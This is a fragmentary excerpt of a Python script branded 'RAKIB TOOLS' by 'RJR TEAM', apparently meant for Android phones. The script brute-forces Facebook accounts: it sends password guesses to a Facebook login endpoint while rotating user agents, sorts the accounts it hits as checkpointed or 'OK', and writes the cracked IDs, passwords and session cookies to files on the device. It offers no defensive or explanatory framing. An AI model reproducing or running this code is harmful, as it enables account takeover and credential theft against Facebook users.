...
def main():
    stored_password = "V1.4"  # Replace with your stored password
    ...
    while True:
        ...
        if is_password_valid(user_password, stored_password):
            ...
            print("Welcome to RAKIB TOOLS!")
            os.system('espeak -a 300 "Welcome to RAKIB Tools varson 1.4 ..."')
            time.sleep(2)
            os.system('clear')
...
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3231 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36",]
...
\033[0;91m██╔══██╗\033[0;92m██╔══██║\033[0;91m██╔═██╗ \033[0;92m██║\033[0;91m██╔══██╗ 
\033[0;91m██║  ██║\033[0;92m██║  ██║\033[0;91m██║  ██╗\033[0;92m██║\033[0;91m██████╔╝
\033[0;91m╚═╝  ╚═╝\033[0;92m╚═╝  ╚═╝\033[0;91m╚═╝  ╚═╝\033[0;92m╚═╝ \033[0;91m╚═════╝\033[0;95mRJR TEAM
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;42m    [ WORKING MOBILE DATA + WIFI ]       \033[0;95m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ...
 ┃ [] VIRSON    \033[1;92m: \033[1;32m[1.4]\033[0;32m
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"""
def Subscraption():
    ...
    os.system('clear')
    print(logo)
    r1 = requests.get("https://github.com/bothacker33/Rakib/blob/main/Approved").text
    if id in r1:
        os.system('clear')
        print(logo)
    else:
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/𝐑𝐀𝐊𝐈𝐁.txt  Etc...]')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[𝐑𝐀𝐊𝐈𝐁•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.write(f"\r\033[100;92m{bo}[𝐑𝐀𝐊𝐈𝐁•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [OK{bo}•{H}{ok}{P}] [{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;97m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;97m[\033[0;93m𝐑𝐀𝐊𝐈𝐁-Cp] {idf} \033[0;97m• \033[0;93m{pw}')
                os.system('espeak -a 300 " Cp,"')
                open('/sdcard/𝐑𝐀𝐊𝐈𝐁-CP.txt', 'a').write( cid+' | '+ps+' \n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
                ...
                print(f'\r\033[0;95m𝐑𝐀𝐊𝐈𝐁-Ok] {idf} \033[0;97m• \033[0;95m{pw}\n\033[0 ;[🌺]= COOKIES • \x1b[38;5;208m{kuki}\033[0;97m\n')
                #cek_apk(session,coki)
                print(f'\r\033[0;95m[𝐑𝐀𝐊𝐈𝐁\033[0;97m•\033[0;95mOk💚] {idf} \033[0;97m• \033[0;95m{pw}\n\033[0;93m[🌺]= COOKIES • \033[100;92m{kuki}\033[0;97m\n')
                os.system('espeak -a 300 " Rakib,  Ok,  id"')
                open('/sdcard/𝐑𝐀𝐊𝐈𝐁-Ok.txt', 'a').write( cid+' | '+ps+' \n')
                break
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[𝐑𝐀𝐊𝐈𝐁-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[{time.strftime("%H:%M")}\033[0;97m•\033[0;93m𝐑𝐀𝐊𝐈𝐁-Cp] {idf} \033[0;97m• \033[0;93m{pw}')
                os.system('espeak -a 300 " Cp,"')
                open('/sdcard/𝐑𝐀𝐊𝐈𝐁-CP.txt', 'a').write( cid+' | '+ps+' \n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}\033[0;97m•\033[0;95m𝐑𝐀𝐊𝐈𝐁-Ok] {idf} \033[0;97m• \033[0;95m{pw} ')
                #cek_apk(session,coki)
                os.system('espeak -a 300 " 𝐑𝐀𝐊𝐈𝐁,  Ok,  id"')
                open('/sdcard/𝐑𝐀𝐊𝐈𝐁-Ok.txt', 'a').write( cid+' | '+ps+' \n')
                break
